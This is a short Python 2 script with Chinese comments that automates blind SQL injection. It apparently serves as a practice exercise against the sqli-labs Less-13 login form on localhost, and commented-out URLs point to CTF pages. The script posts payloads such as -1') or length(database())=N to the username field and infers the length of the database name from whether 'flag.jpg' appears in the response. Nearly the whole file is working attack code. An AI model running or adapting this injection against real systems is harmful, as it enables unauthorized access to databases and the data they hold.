# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time
# ulr='http://ctf5.shiyanbar.com/web/index_3.php?id='#简单sql注入3
#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://localhost/sqli-labs/Less-5/?id=' #sqli-lab lesson 5
url='http://localhost/sqli-labs/Less-13/?id=' #sqli-lab lesson 8
#定义语法关键字测试使用的载荷库
f = file("result.txt", "w+")
# 定义攻击载荷
keyword='flag.jpg'
payload_end=' -- #/*'
password='*/-- #'
versionlen=0
stop=False
for i in range(1,10):
    #payload1_version = "1%27%20and%20length(database())="  # 查看length（version）函数判断版本名长度 #单引号 lesson5
    #payload1_version = "1%22%20and%20length(database())="  # 查看length（version）函数判断版本名长度 #双引号lesson6
    payload1_version = "-1') or length(database())="  # 查看length（version）函数判断版本名长度 #括号lesson13
    try:
        payload =payload1_version + str(i) + payload_end
        # print url + payload
        postdata = dict(uname=payload, passwd=password,submit='Submit')
        # url编码
        postdata = urllib.urlencode(postdata)
        print postdata
        # enable cookie
        req = urllib2.Request(url, postdata)
        res = urllib2.urlopen(req, data=None, timeout=2)
        text = res.read()
        if (text.find(keyword) > -1):
            #print text
            print '数据库名长度是：', str(i)
            f.writelines('数据库名长度是：'+str(i))
            break
    except Exception, e:
        print e
f.close()
